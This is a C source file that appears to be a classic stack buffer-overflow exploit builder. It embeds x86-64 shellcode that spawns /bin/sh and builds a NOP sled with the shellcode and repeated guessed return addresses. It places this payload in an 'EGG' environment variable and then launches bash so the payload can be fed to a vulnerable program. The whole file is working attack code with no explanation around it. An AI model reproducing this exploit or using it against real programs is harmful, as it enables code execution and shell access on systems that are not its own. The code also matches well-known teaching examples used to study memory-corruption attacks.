#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET                0
#define DEFAULT_BUFFER_SIZE         512
#define NOP                         0x90

char code[] = "\xeb\x27\x5e\x48\xc7\xc0\xff\xff\xff\xff\x48\x83\xe8\xc4\x48\x89\xf7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x31\xff\x48\xc7\xc0\xff\xff\xff\xff\x48\x83\xe8\xc3\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";

uint64_t get_sp(void) {
    __asm__("mov %rsp, %rax");
}

int main(int argc, char** argv) {
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i;

    if (argc > 1) bsize = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);

    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("Using address: 0x%x\n", (unsigned int)addr);

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4) {
        *(addr_ptr++) = addr;
    }

    for (i = 0; i < bsize / 2; i++) {
        buff[i] = NOP;
    }

    ptr = buff + ((bsize / 2) - (strlen(code) / 2));
    for (i = 0; i < strlen(code); i++) {
        *(ptr++) = code[i];
    }
    buff[bsize - 1] = '\0';

    memcpy(buff, "EGG=", 4);
    putenv(buff);
    printf ("buff: %s\n", code);
    system("/bin/bash");
    return 0;
}